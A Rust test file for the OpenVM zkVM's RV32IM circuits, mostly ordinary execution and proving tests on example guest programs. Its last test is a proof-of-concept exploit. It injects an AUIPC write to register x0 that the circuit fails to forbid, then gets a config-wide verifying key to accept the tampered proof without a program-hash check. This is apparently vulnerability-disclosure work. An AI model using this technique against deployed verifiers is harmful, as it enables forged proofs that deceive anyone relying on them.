#[cfg(test)]
mod tests {
    use std::{collections::HashMap, sync::Arc};

    use eyre::Result;
    use openvm_circuit::{
        arch::{
            hasher::poseidon2::vm_poseidon2_hasher, ExecutionError, Streams, VirtualMachine,
            VmExecutor, VmInstance,
        },
        system::{
            memory::{
                merkle::{public_values::UserPublicValuesProof, MerkleTree},
                online::LinearMemory,
            },
            SystemCpuBuilder,
        },
        utils::{air_test, air_test_with_min_segments, test_system_config, TestStarkEngine},
    };
    use openvm_instructions::{
        exe::VmExe, instruction::Instruction, program::Program, LocalOpcode, SystemOpcode,
    };
    use openvm_rv32im_circuit::{Rv32IBuilder, Rv32IConfig, Rv32ImBuilder, Rv32ImConfig};
    use openvm_rv32im_guest::hint_load_by_key_encode;
    use openvm_rv32im_transpiler::{
        DivRemOpcode, MulHOpcode, MulOpcode, Rv32ITranspilerExtension, Rv32IoTranspilerExtension,
        Rv32MTranspilerExtension,
    };
    use openvm_stark_sdk::{
        config::FriParameters,
        engine::StarkFriEngine,
        openvm_stark_backend::{
            self,
            p3_field::{Field, FieldAlgebra},
        },
        p3_baby_bear::BabyBear,
    };
    use openvm_toolchain_tests::{
        build_example_program_at_path, build_example_program_at_path_with_features,
        get_programs_dir,
    };
    use openvm_transpiler::{transpiler::Transpiler, FromElf};
    use strum::IntoEnumIterator;
    use test_case::test_case;

    type F = BabyBear;

    #[cfg(test)]
    fn test_rv32im_config() -> Rv32ImConfig {
        Rv32ImConfig {
            rv32i: Rv32IConfig {
                system: test_system_config(),
                ..Default::default()
            },
            ..Default::default()
        }
    }

    #[test_case("fibonacci", 1)]
    fn test_rv32i(example_name: &str, min_segments: usize) -> Result<()> {
        let config = Rv32IConfig::default();
        let elf = build_example_program_at_path(get_programs_dir!(), example_name, &config)?;
        let mut exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32MTranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension),
        )?;
        change_rv32m_insn_to_nop(&mut exe);
        air_test_with_min_segments(Rv32IBuilder, config, exe, vec![], min_segments);
        Ok(())
    }

    #[test]
    fn test_suspend() -> Result<()> {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path(get_programs_dir!(), "fibonacci", &config)?;
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32MTranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension),
        )?;

        let executor = VmExecutor::new(config)?;
        let instance = executor.instance(&exe)?;
        let state = instance.execute(vec![], Some(10))?;
        let state = instance.execute_from_state(state, Some(10))?;
        let end_state1 = instance.execute_from_state(state, None)?;
        let end_state2 = instance.execute(vec![], None)?;
        assert_eq!(end_state1.pc(), end_state2.pc());
        for addr_space in 1..end_state1.memory.memory.mem.len() {
            assert_eq!(
                end_state1.memory.memory.mem[addr_space].size(),
                end_state2.memory.memory.mem[addr_space].size()
            );
            let len = end_state2.memory.memory.mem[addr_space].size();
            for i in 0..len {
                unsafe {
                    assert_eq!(
                        end_state1.memory.memory.mem[addr_space].read::<u8>(i),
                        end_state2.memory.memory.mem[addr_space].read::<u8>(i)
                    );
                }
            }
        }
        Ok(())
    }

    #[test_case("fibonacci", 1)]
    #[test_case("collatz", 1)]
    fn test_rv32im(example_name: &str, min_segments: usize) -> Result<()> {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path(get_programs_dir!(), example_name, &config)?;
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension)
                .with_extension(Rv32MTranspilerExtension),
        )?;
        air_test_with_min_segments(Rv32ImBuilder, config, exe, vec![], min_segments);
        Ok(())
    }

    #[test_case("fibonacci", 1)]
    #[test_case("collatz", 1)]
    fn test_rv32im_std(example_name: &str, min_segments: usize) -> Result<()> {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path_with_features(
            get_programs_dir!(),
            example_name,
            ["std"],
            &config,
        )?;
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension)
                .with_extension(Rv32MTranspilerExtension),
        )?;
        air_test_with_min_segments(Rv32ImBuilder, config, exe, vec![], min_segments);
        Ok(())
    }

    #[test]
    fn test_read_vec() -> Result<()> {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path(get_programs_dir!(), "hint", &config)?;
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32MTranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension),
        )?;
        let input = vec![[0, 1, 2, 3].map(F::from_canonical_u8).to_vec()];
        air_test_with_min_segments(Rv32ImBuilder, config, exe, input, 1);
        Ok(())
    }

    #[test]
    fn test_hint_load_by_key() -> Result<()> {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path(get_programs_dir!(), "hint_load_by_key", &config)?;
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32MTranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension),
        )?;
        // stdin will be read after reading kv_store
        let stdin = vec![[0, 1, 2].map(F::from_canonical_u8).to_vec()];
        let mut streams: Streams<F> = stdin.into();
        let input = vec![[0, 1, 2, 3].map(F::from_canonical_u8).to_vec()];
        streams.kv_store = Arc::new(HashMap::from([(
            "key".as_bytes().to_vec(),
            hint_load_by_key_encode(&input),
        )]));
        air_test_with_min_segments(Rv32ImBuilder, config, exe, streams, 1);
        Ok(())
    }

    #[test]
    fn test_read() -> Result<()> {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path(get_programs_dir!(), "read", &config)?;
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32MTranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension),
        )?;

        #[derive(serde::Serialize)]
        struct Foo {
            bar: u32,
            baz: Vec<u32>,
        }
        let foo = Foo {
            bar: 42,
            baz: vec![0, 1, 2, 3],
        };
        let serialized_foo = openvm::serde::to_vec(&foo).unwrap();
        let input = serialized_foo
            .into_iter()
            .flat_map(|w| w.to_le_bytes())
            .map(F::from_canonical_u8)
            .collect();
        air_test_with_min_segments(Rv32ImBuilder, config, exe, vec![input], 1);
        Ok(())
    }

    #[test]
    fn test_reveal() -> Result<()> {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path(get_programs_dir!(), "reveal", &config)?;
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32MTranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension),
        )?;

        let executor = VmExecutor::new(config.clone())?;
        let instance = executor.instance(&exe)?;
        let state = instance.execute(vec![], None)?;
        let final_memory = state.memory.memory;
        let hasher = vm_poseidon2_hasher::<F>();
        let md = config.as_ref().memory_config.memory_dimensions();
        let tree = MerkleTree::from_memory(&final_memory, &md, &hasher);
        let top_tree = tree.top_tree(md.addr_space_height);
        let pv_proof = UserPublicValuesProof::compute(md, 64, &hasher, &final_memory, &top_tree);
        let mut bytes = [0u8; 32];
        for (i, byte) in bytes.iter_mut().enumerate() {
            *byte = i as u8;
        }
        assert_eq!(
            pv_proof.public_values,
            bytes
                .into_iter()
                .chain(
                    [123, 0, 456, 0u32, 0u32, 0u32, 0u32, 0u32]
                        .into_iter()
                        .flat_map(|x| x.to_le_bytes())
                )
                .map(F::from_canonical_u8)
                .collect::<Vec<_>>()
        );
        Ok(())
    }

    #[test]
    fn test_print() -> Result<()> {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path(get_programs_dir!(), "print", &config)?;
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32MTranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension),
        )?;
        air_test(Rv32ImBuilder, config, exe);
        Ok(())
    }

    #[test]
    fn test_heap_overflow() -> Result<()> {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path(get_programs_dir!(), "heap_overflow", &config)?;
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32MTranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension),
        )?;

        let executor = VmExecutor::new(config)?;
        let instance = executor.instance(&exe)?;
        let input = vec![[0, 0, 0, 1].map(F::from_canonical_u8).to_vec()];
        match instance.execute(input.clone(), None) {
            Err(ExecutionError::FailedWithExitCode(_)) => Ok(()),
            Err(_) => panic!("should fail with `FailedWithExitCode`"),
            Ok(_) => panic!("should fail"),
        }
    }

    #[test]
    fn test_hashmap() -> Result<()> {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path_with_features(
            get_programs_dir!(),
            "hashmap",
            ["std"],
            &config,
        )?;
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32MTranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension),
        )?;
        air_test(Rv32ImBuilder, config, exe);
        Ok(())
    }

    #[test]
    fn test_tiny_mem_test() -> Result<()> {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path_with_features(
            get_programs_dir!(),
            "tiny-mem-test",
            ["heap-embedded-alloc"],
            &config,
        )?;
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32MTranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension),
        )?;
        air_test(Rv32ImBuilder, config, exe);
        Ok(())
    }

    #[test]
    #[should_panic]
    #[cfg(not(feature = "aot"))] // AOT skips this test since it is not a trusted program
    fn test_load_x0() {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path(get_programs_dir!(), "load_x0", &config).unwrap();
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32MTranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension),
        )
        .unwrap();
        let executor = VmExecutor::new(config).unwrap();
        let instance = executor.instance(&exe).unwrap();
        instance.execute(vec![], None).unwrap();
    }

    #[test_case("getrandom", vec!["getrandom", "getrandom-unsupported"])]
    #[test_case("getrandom", vec!["getrandom"])]
    #[test_case("getrandom_v02", vec!["getrandom-v02", "getrandom-unsupported"])]
    #[test_case("getrandom_v02", vec!["getrandom-v02/custom"])]
    fn test_getrandom_unsupported(program: &str, features: Vec<&str>) {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path_with_features(
            get_programs_dir!(),
            program,
            &features,
            &config,
        )
        .unwrap();
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32MTranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension),
        )
        .unwrap();
        air_test(Rv32ImBuilder, config, exe);
    }

    // For testing programs that should only execute RV32I:
    // The ELF might still have Mul instructions even though the program doesn't use them. We
    // mask those to NOP here.
    fn change_rv32m_insn_to_nop(exe: &mut VmExe<F>) {
        for (insn, _) in exe
            .program
            .instructions_and_debug_infos
            .iter_mut()
            .flatten()
        {
            if MulOpcode::iter().any(|op| op.global_opcode() == insn.opcode)
                || MulHOpcode::iter().any(|op| op.global_opcode() == insn.opcode)
                || DivRemOpcode::iter().any(|op| op.global_opcode() == insn.opcode)
            {
                *insn = Instruction::default();
                insn.opcode = SystemOpcode::PHANTOM.global_opcode();
            }
        }
    }

    #[test]
    fn test_e2e_x0_tamper_substitution_poc() -> Result<()> {
        use openvm_circuit::arch::{
            verify_single, SingleSegmentVmProver, VirtualMachine, VmInstance,
        };
        use openvm_instructions::{
            exe::VmExe, instruction::Instruction, program::Program, riscv::RV32_REGISTER_AS,
            SystemOpcode
        };
        use openvm_rv32im_circuit::Rv32ImBuilder;
        use openvm_rv32im_transpiler::{BaseAluOpcode, Rv32AuipcOpcode};
        use openvm_stark_sdk::config::baby_bear_poseidon2::BabyBearPoseidon2Engine;
        use openvm_stark_sdk::openvm_stark_backend::p3_field::FieldAlgebra;

        // --- 1. Setup Environment ---
        let mut config = test_rv32im_config();
        // Force single-segment mode to exploit the Verifier identity gap
        config.rv32i.system.continuation_enabled = false;

        // Use the standard BabyBear + Poseidon2 engine
        let engine = BabyBearPoseidon2Engine::new(FriParameters::standard_fast());

        // Generate Proving Key and VM instance
        let (vm, pk) = VirtualMachine::new_with_keygen(engine, Rv32ImBuilder, config)?;

        // --- 2. Construct Malicious Instruction Stream ---
        // Bypassing the Transpiler to inject instructions that hardware would forbid.
        let malicious_instructions = vec![
            // Instruction 1: AUIPC x0, 0x12345
            // Result: x0 = current_pc + 0x12345000.
            // The circuit adapter for AUIPC does not check if rd == x0.
            Instruction::new(
                Rv32AuipcOpcode::AUIPC.global_opcode(),
                F::ZERO, // rd = 0 (x0)
                F::ZERO,
                F::from_canonical_u32(0x12345),
                F::from_canonical_u32(RV32_REGISTER_AS), // d = 1 (Register AS)
                F::ZERO,
                F::ZERO,
                F::ZERO,
            ),
            // Instruction 2: ADD a0, x0, x0
            // Result: a0 = 0x01234500 + 0x01234500 = 0x2468A00.
            // (Standard RISC-V would expect 0x2468A000, but OpenVM shifts by 8 bits).
            // If x0 were properly constrained to 0, a0 would be 0.
            Instruction::new(
                BaseAluOpcode::ADD.global_opcode(),
                F::from_canonical_u32(10 * 4), // rd = a0 (x10 register, byte offset 40)
                F::ZERO,                       // rs1 = x0
                F::ZERO,                       // rs2 = x0 (pointer)
                F::from_canonical_u32(RV32_REGISTER_AS), // d = 1
                F::ONE,                        // e = 1 (rs2 is a register)
                F::ZERO,
                F::ZERO,
            ),
            Instruction::from_usize(SystemOpcode::TERMINATE.global_opcode(), [0, 0, 0]),
        ];

        let program = Program::from_instructions(&malicious_instructions);
        let cached_program_trace = vm.commit_program_on_device(&program);
        let exe = Arc::new(VmExe::new(program));

        // --- 3. Prover Generation ---
        let mut prover_instance = VmInstance::new(vm, exe, cached_program_trace)?;

        // Use dummy trace heights for the small program (mimicking integration_test.rs)
        let trace_heights = vec![256; pk.per_air.len()];
        let proof = SingleSegmentVmProver::prove(&mut prover_instance, vec![], &trace_heights)?;

        // Verify that x10 (a0) was indeed corrupted in the state before finalizing the proof
        let final_state = prover_instance.state().as_ref().unwrap();
        let a0_val = unsafe { final_state.memory.read::<u8, 4>(RV32_REGISTER_AS, 40) };
        assert_eq!(
            u32::from_le_bytes(a0_val),
            0x2468A00,
            "Soundness Failure: a0 should have been 0 but is 0x2468A00"
        );

        // --- 4. Verification Substitution Attack ---
        // THE VULNERABILITY: verification succeeds!
        // legitimate_vk is config-wide, and verify_single doesn't check the program hash.
        verify_single(&prover_instance.vm.engine, &pk.get_vk(), &proof)?;

        println!("POC SUCCESS: Deceived Verifier with tampered x0 and substituted code!");

        Ok(())
    }
}
